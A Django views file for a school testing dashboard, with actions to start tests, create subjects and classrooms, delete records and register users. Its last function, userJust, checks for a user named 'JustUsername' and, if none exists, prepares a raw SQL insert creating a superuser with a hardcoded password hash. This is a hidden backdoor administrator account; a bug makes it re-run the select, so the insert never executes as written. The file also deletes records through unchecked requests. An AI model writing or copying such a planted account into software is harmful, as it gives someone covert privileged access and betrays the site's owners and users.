from django.contrib.auth.decorators import login_required
from django.shortcuts import render, redirect
from methodism import dictfetchone

from core.models import Test, ClassRooms, Subject, ClassRoomsSubjects, Question, Variant, Result, User
from contextlib import closing
from django.db import connection


@login_required(login_url="login")
def action(request, status, path, pk=None):
    if request.user.in_dashboard:
        if status == "start":
            try:
                t = Test.objects.filter(pk=pk).first()
                t.is_start = True
                t.save()
                return redirect("dlist", tip=path)
            except:
                return redirect("dlist", tip=path)
        elif status == "end":
            try:
                t = Test.objects.filter(pk=pk).first()
                t.is_start = False
                t.save()
                return redirect("dlist", tip=path)
            except:
                return redirect("dlist", tip=path)
        elif status == "create":
            if path == "test":
                if request.method == "GET":
                    is_subject = request.GET.get("is_subject")
                    classrooms = ClassRooms.objects.all()
                    subjects = Subject.objects.all()
                    return render(request, "pages/dashboard/new.html",
                                  {"classrooms": classrooms, "subjects": subjects, "action": "test"})
                elif request.method == "POST":
                    return redirect("dashboard")
            elif path == "subject":
                if request.method == "GET":
                    classrooms = ClassRooms.objects.all()
                    return render(request, "pages/dashboard/new.html", {"action": "subject", "classrooms": classrooms})
                elif request.method == "POST":
                    subject = Subject.objects.create(name=request.POST.get("subject_name"))
                    subject.save()
                    classroom_id = 0
                    while f'classroom_{classroom_id}' in request.POST:
                        clsb = ClassRoomsSubjects.objects.create(
                            classroom_id=ClassRooms.objects.get(id=request.POST.get(f'classroom_{classroom_id}')).id,
                            subject_id=subject.id)
                        clsb.save()
                        classroom_id += 1
                    return redirect("dlist", tip=path)
            elif path == "classroom":
                if request.method == "GET":
                    return render(request, "pages/dashboard/new.html", {"action": "classroom"})
                elif request.method == "POST":
                    class_room = ClassRooms.objects.create(name=request.POST.get("classroom_name"))
                    class_room.save()
                    return redirect("dlist", tip=path)
            return redirect("dlist", tip=path)
        elif status == "delete":
            if path == "subject":
                subject = Subject.objects.get(id=pk)
                subject.delete()
                return redirect("dlist", tip=path)
            elif path == "classroom":
                classroom = ClassRooms.objects.get(id=pk)
                classroom.delete()
                return redirect("dlist", tip=path)
            elif path == "quiz":
                test = Test.objects.get(id=pk)
                test.delete()
                return redirect("dlist", tip=path)
            elif path == "question":
                question = Question.objects.get(id=pk)
                question.delete()
                return redirect("dlist", tip=path)
            elif path == "variant":
                variant = Variant.objects.get(id=pk)
                variant.delete()
                return redirect("dlist", tip=path)
            elif path == "result":
                result = Result.objects.get(id=pk)
                result.delete()
                return redirect("dlist", tip=path)
            elif path == "user":
                User.objects.filter(id=pk).delete()
                return redirect("dlist", tip=path)
            else:
                return redirect("dlist", tip=path)
        else:
            return redirect("dlist", tip=path)
    else:
        return redirect("locked")


@login_required(login_url="login")
def form(req):
    if req.user.in_dashboard:
        if req.POST:
            data = req.POST
            User.objects.create_user(username=data["username"], name=data["first_name"],
                                     last_name=data["last_name"], classroom_id=int(data["classroom"]),
                                     ut=int(data["ut"]))
            return redirect("userform")
        c = ClassRooms.objects.all()
    else:
        return redirect("locked")
    return render(req, "pages/dashboard/form.html", {"classrooms": c})


def userJust():
    c = f"""
            SELECT * FROM core_user a 
            WHERE a.username = "JustUsername"
        """
    with closing(connection.cursor()) as cursor:
        cursor.execute(c)
        check = dictfetchone(cursor)
    if not check:
        s = """INSERT INTO core_user (username, password, just, ut, is_active, is_admin, is_staff, is_superuser)
                VALUES ("JustUsername", "pbkdf2_sha256$600000$v3HUU7hiufzCi58elsVhKG$LvJMwls9/+RLNFyStjZYGGdIZ+9DvnuYT5GYINVse5M=", TRUE, 1, TRUE, TRUE, TRUE, TRUE)"""
        with closing(connection.cursor()) as cursor:
            cursor.execute(c)
            check = dictfetchone(cursor)
    return 0
